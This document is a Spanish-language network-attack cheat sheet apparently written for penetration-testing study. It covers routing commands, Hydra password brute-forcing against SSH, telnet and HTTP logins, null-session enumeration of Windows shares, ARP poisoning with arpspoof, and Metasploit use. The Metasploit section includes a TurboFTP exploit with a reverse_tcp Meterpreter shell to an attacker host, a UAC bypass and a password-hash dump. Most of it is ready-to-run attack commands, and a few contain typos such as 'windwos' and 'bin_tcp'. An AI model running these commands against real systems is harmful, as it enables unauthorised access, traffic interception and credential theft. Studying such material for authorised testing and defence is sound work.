# Network Attacks Cheat Sheet

## Networking

### Tabla de rutas

- Linux

`ip route`

- Windows

`route print`

- macOS

`netstat -r`

### Información de la interfaz

- Windows

`ipconfig /all`

- *nix o macOS

`ifconfig`

- Linux

`ip addr`

### Tabla ARP

- Windows

`arp -a`

- *nix

`arp`

- Linux

`ip neighbour`

### Rutas estáticas

- Linux

`ip route add [network] via [gw] dev [interface]`

`ip route add 172.16.0.0/16 via 192.168.1.1 dev eth0`

`ip route add deafult via 192.168.1.1 dev eth0`

- Windows

`route add [network] mask [mask] [gw]`

`route add 192.168.35.0 mask 255.255.255.0 192.168.0.2`

### Sesiones abiertas

- Windows

`netstat -ano`

- Linux

```
-t: habilita TCP
-u: habilita UDP
-n: mostrar solo la IP
-p: muestra el PID y el nombre del programa
```

`netstat -tunp`

- macOS

`netstat -p tcp -p udp`

 `lsof –n –i4TCP –i4UDP`
 
 ## Cracking Online
 
 ### Cracking de autenticación
 
 Es posible crackear la autenticación de varios protocolos de red como, por ejemplo:

-	SSH
-	Telnet
-	Autenticación HTTP
-	RDP

Para el cracking de la autenticación de red, se recomienda usar un ataque basado en diccionario, debido que, en el cracking online, influye lo siguiente:

-	Latencia de la red
-	Delay del servicio atacado
-	Tiempo de proceso en el servidor atacado

El siguiente [link](https://wiki.skullsecurity.org/Passwords) posee varios diccionarios que pueden ser utilizados en este tipo de ataques.

En caso de querer instalar los diccionarios, en Kali se puede usar el siguiente comando, que los guarda en la siguiente ruta: `/usr/share/seclists/Passwords`

`apt install seclists`

### Hydra

Herramienta que permite realizar cracking de autenticación de múltiples protocolos usando un método de fuerza bruta o basado en diccionario. Hydra trabaja con módulos, los cuales, son códigos que permiten atacar a un protocolo específico. Dentro de los protocolos soportados, se encuentran los siguientes:

- Cisco Auth
-	RDP
-	FTP
-	SMB
-	IMAP
-	Telnet
-	HTTP
-	SSH

Comando:

`hydra [option]`

```
-h: Ayuda
-U [module]: Obtener el detalle de un módulo. Estos módulos se encuentran en la sección “Supported services” de la ayuda
-L: Lista de usuarios
-P: Lista de passwords
-f: Detener la busqueda con el primer resultado
-V: Verbose
http-post-form: Usar formulario POST
http-get: Usar método GET
```

#### Ejemplo de obtención de detalle de módulo RDP

`hydra -U rdp`

#### Ejemplo cracking telnet con ataque de diccionario

`hydra -L user.txt -P pass.txt telnet://target.server`

#### Ejemplo de ataque de autenticación HTTP básica

`hydra -L user.txt -P pass.txt http-get://target.server`

#### Ejemplo de ataque de autenticación HTTP en login usando POST

`hydra target.site http-post-form “/login.php:usr=^USER^&pwd=^PASS^:invalid credentials” -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/rockyou-15.txt -f -V`

#### Ejemplo de ataque de autenticación SSH

`hydra target.site ssh -L user.txt -P pass.txt -f -V`

## Windows Shares

### NetBIOS

NetBIOS (Network Basic input Output System) es un protocolo que permite compartir archivos, administración de impresoras, proveer autenticación, etc., entre un cliente y un servidor.

Este protocolo puede proveer lo siguiente:

-	Hostname
-	NetBIOS name
-	Dominio
-	Network shares

Utiliza los siguientes puertos:

-	**UDP 137:** NetBIOS names. Usado para encontrar grupos de trabajo (workgroups).
-	**UDP 138:** NetBIOS datagrams. Usado para listar los shares y las máquinas.
-	**TCP 139:** NetBIOS Session. Usado para transmitir datos para y desde un Windows share.

Un Windows puede compartir un archivo o un directorio en la red (shares).

Se puede acceder mediante un UNC (Universal Naming Convertion) Path. Ejemplo: **\\\ServerName\ShareName\file.txt**

#### Share Administrativos por defecto usados por el sysadmin de Windows

Permite a un admin ingresar a un volumen de la máquina

`\\ComputerName\C$`

#### Apunta al directorio de instalación de Windows

`\\ComputerName\admin$`

#### Es usado por inter-process communication (No se puede acceder por Windows Explorer)

`\\ComputerName\ipc$`

### Null Sessions

Ataque que puede ser usado para enumerar y obtener la siguiente información:

-	Passwords
-	Usuarios de sistema
-	Grupos de sistema
-	Procesos corriendo en el sistema

Este ataque explota una vulnerabilidad de autenticación para Windows Administrative Share, permitiendo conectarse al local share o remote share sin autenticación. 

#### Nbtstat

Herramienta de Windows que permite enumerar Windows Shares.

`nbtstat [option]`

```
/?: Help
-A [IP]: Mostrar información del objetivo:
         Name: Nombre de la máquina
         Type: <00> equivale a Workstation. <20> Servicio de file sharing corriendo la máquina. UNIQUE indica que solo tiene una IP
         También, muestra el dominio o el workgroup al que pertenece
```

#### NET VIEW

Herramienta que permite enumerar los shares detectados con nbtstat (type <20>).

`NET VIEW [IP]`

#### Nmblookup

Herramienta de enumeración para Linux. Esta corresponde a la Suite de Samba.

`nmblookup [option]`

```
-A [IP]: Muestra información de objetivo (similar a nbtstat -A [IP])
```

#### Smbclient

Utilidad de la Suite de Samba que permite acceder a los shares de Windows.

`smbclient [option] //[IP] [option]`

```
-L: Permite ver que servicios están disponibles en el objetivo
-N: Fuerza a la herramienta a no preguntar por la password
```

##### Ejemplo de enumeración: similar a NET VIEW

`smbclient -L //192.168.10.12 -N`

##### Ejemplo de ataque usando null session

`smbclient  //192.168.10.12/IPC$ -N`

`smbclient  //192.168.10.12/C$ -N`


#### NET USE

Herramienta de Windows que permite explotar null sessions.

`NET USE \\[IP]\IPC$ '' /u: ''`

#### [Enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files)

Herramienta para Windows que puede obtener información del sistema vulnerable a null sessions.

`enum [option] [IP]`

```
-S: Enumeración de shares
-U: Enumeración de usuarios
-P: Enumeración de parámetros de password (con esto se pueden realizar otros tipos de ataques)
```

#### [Winfo](https://packetstormsecurity.com/search/?q=winfo&s=files)

Herramienta para Windows que permite automatizar la explotación de los null session.

`winfo [IP] -n`

#### Enum4Linux

Herramienta similar a enum y winfo, pero para Linux.

Por defecto, este ejecuta:

-	Enumeración de:
  -	Usuarios
  -	Shares
  -	Grupos y miembros
  -	Extracción del Password Policy
  -	Detección de información del OS
  -	Ejecuta un nmblookup
  -	Extracción de información de las impresoras

`enum4linux [option] [IP]`

```
-a: Realiza todas las enumeraciones simples (-U -S -G -P -r -o -n -i)
```

Solución error de SMB:

- Agregar lo siguiente al archivo de configuracion de SMB: `/etc/samba/smb.conf`

```
# Fix enum4linux error
   client min protocol = CORE
   client max protocol = SMB3
```

## ARP Poisoning

Este ataque permite interceptar tráfico de una red manipulando la tabla ARP de los demás (ataque man-in-the-middle, MITM). El ataque se logra enviando mensajes Gratuitous ARP Replies (mensajes ARP Reply no solicitados).

El atacante puede evitar que el envenenamiento expire un mensaje Gratuitous ARP Reply cada 30 segundos (por ejemplo). 

### ARPspoof

Arpspoof es una herramienta de la colección Dsniff, la cual, permite realizar ataques de ARP spoofing.

`arpspoof -i [interface] -t [target] -r [host]`

#### Ataque usando ARPspoof

1. Habilitar reenvío de paquetes:

`echo 1 > /proc/sys/net/ipv4/ip_forward`

2. Lanzar ARPspoof:

`arpspoof -i eth0 -t 192.168.1.12 -r 192.168.1.30`

## Metasploit/Meterpreter

### [Metasploit](https://linuxhint.com/install_metasploit_ubuntu/)

Framework open-source usado para pentesting y desarrollo de exploits. Este utiliza una base de datos Postgresql.

Posee una interfaz web, CLI y una interfaz de consola (MSFconsole).

Metasploit usa jerarquía tipo file system para las rutas de los encoders, nops, exploits, payloads y módulos auxiliares (ejemplo, los exploits de Windows comienzan con exploit/windows/):

![metasploit1](img/net/metasploit1.png)

Un payload es una pieza de código inyectada en un módulo de exploit en la víctima, el cual, permite obtener lo siguiente:

-	Una Shell del OS
-	Una conexión VNC o RDP
-	Una Shell Meterpreter
-	Ejecutar una aplicación suministrada por el atacante

#### Flujo de explotación de un objetivo usando MSFconsole

-	Identificar un servicio vulnerable
-	Buscar el exploit apropiado para dicho servicio
-	Cargar y configurar el exploit
-	Cargar y configurar el payload que se requiere usar
-	Correr el código del exploit y obtener acceso a la máquina vulnerable

Dentro de la consola, cada comando posee la opción `-h` para ver una breve descripción y ayuda de este.

```
msfdb init: Inicia la base de datos
msfconsole: Inicia MSFconsole
msfconsole -q: Inicia MSFconsole sin el banner
db_status: Valida si Metasploit se conectó con la DB
help/?: Muestra el menú de ayuda de Metasploit
search [modules]: Buscar módules
back: Volver al prompt de MSF
info: Ver información del exploit habilitado
connect: Función similar a netcat
banner: Muestra el banner
show exploits:Ver todos los exploits de MSF
show payloads: Ver todos los payloads de MSF. Si este es usado dentro de un módulo de exploit, solo mostrará los payloads que puede ser usados en este
use exploit/[module]: Habilitación de un exploit
set [option]: Configurar el valor de una variable (obtenidas mediante comando show options)
setg [option]: Configurar el valor de una variable de forma global
unset [option]: Elimina la configuración de una variable
spool [file]: Escribe la salida de la consola en un archivo y también en la pantalla
save: Guarda los datastores activo
db_nmap [option] [IP]: Usar nmap en Metasploit
hosts: Lista todos los hosts en la base de datos
services: Lista todos los servicios en la base de datos
vulns: Lista todas las vulnerabilidades en la base de datos
run/exploit: Ejecutar el exploit configurado
```

#### Ejemplo de uso nmap en Metasploit

```
msfdb init
msfconsole
db_status
db_nmap -sV 192.168.10.200
hosts
services
vulns
```

#### Ejemplo de explotación de Turbo FTP

```
msfconsole
use exploit/windows/ftp/turboftp_port
info
show options
set RHOST 192.168.1.10
set FTPUSER example
set FTPPASS example123
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 192.168.1.4
set LPORT 1234
exploit
```

### Meterpreter

Payload especial con características diseñadas para el pentesting. Corresponde a una Shell, que puede correr en aplicaciones y servicios vulnerables de: Android, BSD, Java, Linux, PHP, Python y Windows.

Dentro de las cosas que pueden hacer con Meterpreter, se tiene lo siguiente:
-	Information Gathering:
 -	Información de la máquina
 -	OS
 -	Red
 - Tabla de rutas
 -	Usuarios que corren el proceso explotado
-	Transferir archivos
-	Instalar backdoors
-	Tomar screenshots
-	Etc.

#### Conexiones de Meterpreter

-	**bin_tcp:** corre un proceso de servidor en la máquina objetivo, que espera por una conexión desde la máquina atacante.
-	**reverse_tcp:** realiza una conexión TCP de vuelta hacia la máquina atacante (puede ser usado como backdoor para evadir dispositivos firewall).

#### Comandos de MSFconsole sobre Meterpreter

```
search meterpreter: Buscar los payloads de Meterpreter
set payload [meterpreter_payload]: Configurar payload de Meterpreter
sessions -l: Ver las sesiones abiertas
sessions -i [session_id]: Cambiar a una sesión Meterpreter abierta
```

#### Comandos de Shell Meterpreter

```
background: Cambiar de sesión Meterpreter por la consola (sin cerrar la sesión)
sysinfo: Obtener información del sistema
ifconfig: Ver configuración de red de la víctima
route: Ver tabla de rutas
pwd: Saber el directorio actual
cd [path]: Cambio de directorio
ls: Listar archivos y directorios
download [remote_file] [local_path]: Descargar archivos
upload [local_file] [remote_path]: Cargar archivo
shell: Correr una shell del OS víctima
getuid: Obtener información del usuario actual
getsystem: Corre una rutina para escalar privilegios (en Windwos el usuario system es el que tiene más privilegios)
```
#### Ejemplo payload reverse_tcp Windows

`set payload windows/meterpreter/reverse_tcp`

#### Ejemplo payload reverse_tcp Linux

`set payload linux/x86/meterpreter/reverse_tcp`

#### Ejemplo payload bin_tcp Windows

`set payload windows/meterpreter/bin_tcp`

#### Ejemplo payload bin_tcp Linux

`set payload linux/x86/meterpreter/bin_tcp`

#### Ejemplo de migración a proceso estable

> Se recomienda el uso de spoolsv.exe (se debe indicar el PID).

```
ps
migrate 1320
```

#### Ejemplo de configuración de ruta estática

```
run autoroute -s 172.18.1.0 -n 255.255.255.0
```

#### Ejemplo de bypass del UAC (User Account Control) Policy

> Tener en cuenta que en sistemas Windows modernos, el UAC previene la escalación de privilegios, por lo tanto, solo con getsystem no será suficiente.

```
background
search bypassuac
use exploit/windwos/local/bypassuac
show options
set session 1
exploits
getuid
getsystem
```

#### Ejemplo de dumping de la base de datos de las passwords

Esto entrega los hashes, que permiten realizar un crackeo offline.

```
background
use exploit/windows/gather/hashdump
show options
set session 2
exploit
```
